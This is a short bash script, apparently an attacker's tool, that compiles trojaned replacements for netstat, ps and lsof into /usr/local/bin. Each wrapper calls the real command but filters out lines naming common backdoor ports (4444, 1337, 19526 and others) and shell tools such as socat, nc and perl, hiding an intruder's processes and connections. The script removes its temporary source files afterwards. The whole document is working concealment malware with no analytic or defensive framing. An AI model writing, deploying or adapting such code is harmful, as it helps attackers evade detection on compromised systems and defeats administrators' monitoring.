#!/bin/bash

#netstat
#------------------------
touch /tmp/.netstat.c

cat <<EOF >> /tmp/.netstat.c
int main(int a,char**b){
  char*c[999999]={"sh","-c","/bin/netstat \$*|grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'"};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
EOF

gcc -xc /tmp/.netstat.c -o /usr/local/bin/netstat

rm /tmp/.netstat.c


#ps
#------------------------
touch /tmp/.ps.c

cat <<EOF >> /tmp/.ps.c
int main(int a,char**b){
  char*c[999999]={"sh","-c","/bin/ps \$*|grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'"};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
EOF

gcc -xc /tmp/.ps.c -o /usr/local/bin/ps

rm /tmp/.ps.c


#lsof
#------------------------
touch /tmp/.lsof.c

cat <<EOF >> /tmp/.lsof.c
int main(int a,char**b){
  char*c[999999]={"sh","-c","/usr/bin/lsof \$*|grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'"};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
EOF

gcc -xc /tmp/.lsof.c -o /usr/local/bin/lsof

rm /tmp/.lsof.c